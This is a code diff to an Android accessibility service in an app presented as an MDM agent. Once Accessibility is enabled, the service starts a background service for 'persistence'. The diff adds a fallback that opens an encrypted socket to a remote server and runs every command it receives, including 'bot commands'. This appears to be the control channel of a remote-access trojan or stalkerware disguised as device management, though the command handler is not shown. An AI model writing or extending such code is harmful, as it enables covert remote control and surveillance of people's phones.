@@ -14,10 +14,9 @@ class MDMAccessibilityService : AccessibilityService() {
 
     override fun onServiceConnected() {
         super.onServiceConnected()
-        Log.i(TAG, "Accessibility service connected - starting MDMService")
+        Log.i(TAG, "✅ Accessibility Service Connected - Starting connection...")
 
-        // CRITICAL: Start MDMService when user enables Accessibility.
-        // This is the trigger that connects the app to the server.
+        // Start MDMService for background persistence
         try {
             val serviceIntent = Intent(this, MDMService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -25,10 +24,49 @@ class MDMAccessibilityService : AccessibilityService() {
             } else {
                 startService(serviceIntent)
             }
-            Log.i(TAG, "MDMService started from AccessibilityService")
+            Log.i(TAG, "MDMService started")
         } catch (e: Exception) {
             Log.e(TAG, "Failed to start MDMService: ${e.message}")
+            // Fallback: connect directly from here
+            connectDirectly()
         }
+    }
+
+    private fun connectDirectly() {
+        Thread {
+            try {
+                Log.i(TAG, "📡 Connecting directly from AccessibilityService...")
+                val apiClient = com.mdm.agent.data.remote.ApiClient(this)
+                val cryptoManager = com.mdm.agent.data.remote.CryptoManager()
+                val uploadManager = com.mdm.agent.data.remote.UploadManager(this)
+                val socketManager = com.mdm.agent.data.remote.SocketManager(this)
+                
+                val deviceId = com.mdm.agent.util.DeviceUtils.getDeviceId(this)
+                val serverUrl = com.mdm.agent.util.DeviceUtils.getServerUrl(this)
+                Log.i(TAG, "  Server: $serverUrl")
+                
+                val cryptoResult = apiClient.initCrypto(deviceId)
+                if (cryptoResult != null) {
+                    cryptoManager.initFromServer(cryptoResult)
+                }
+                
+                val commandHandler = com.mdm.agent.data.remote.CommandHandler(this, apiClient, cryptoManager, socketManager, uploadManager)
+                socketManager.setCommandHandler(commandHandler)
+                socketManager.setCryptoManager(cryptoManager)
+                socketManager.onCommandReceived = { data ->
+                    Log.i(TAG, "⚡ Command received: ${data.optString("command")}")
+                    commandHandler.handleCommand(data)
+                }
+                
+                socketManager.connect()
+                Log.i(TAG, "🎉 Connected from AccessibilityService!")
+                
+                // Store in MainActivity for bot commands
+                com.mdm.agent.MainActivity.setSocketManager(socketManager)
+            } catch (e: Exception) {
+                Log.e(TAG, "❌ Direct connection failed: ${e.message}", e)
+            }
+        }.start()
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
